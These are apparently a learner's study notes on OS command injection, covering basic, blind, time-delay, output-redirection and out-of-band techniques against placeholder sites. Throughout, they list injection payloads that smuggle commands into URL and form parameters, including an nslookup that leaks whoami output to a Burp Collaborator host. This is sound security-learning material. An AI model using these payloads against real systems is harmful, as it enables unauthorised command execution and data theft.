## Basic

- <mark style="background: #CACFD9A6;">stock checker</mark> accesses the information via this URL:
  > `https://insecure-website.com/stockStatus?productID=381&storeID=29` 
  > -> it will call out a shell command like this : `stockreport.pl 381 29`

-  `& echo aiwefwlguh &` => `stockreport.pl & echo aiwefwlguh & 29`
-  `1|whoami` => name of the current user

# Blind

- <mark style="background: #CACFD9A6;">site feedback</mark> -> user enters email address and the feedback message -> calls out to the `mail` program: 
  > `mail -s "This site is great" -aFrom:peter@normal-user.net feedback@vulnerable-website.com` 
- => *the output not returned in the application's response*.
## using time delays

> **`email` parameter**: `email=x||ping+-c+10+127.0.0.1||` => 10sec delay
## by redirecting output

> **`email` parameter**: `email=||whoami>/var/www/images/output.txt||` 
> **`filename` parameter**: `filename=output.txt` => response contains the output
## by using out-of-band (OAST)

- ex1:
> **`email` parameter**: `email=x||nslookup+x.BURP-COLLABORATOR-SUBDOMAIN||`
- ex2:
> **`email` parameter**: `email=||nslookup+$(whoami).BURP-COLLABORATOR-SUBDOMAIN||`
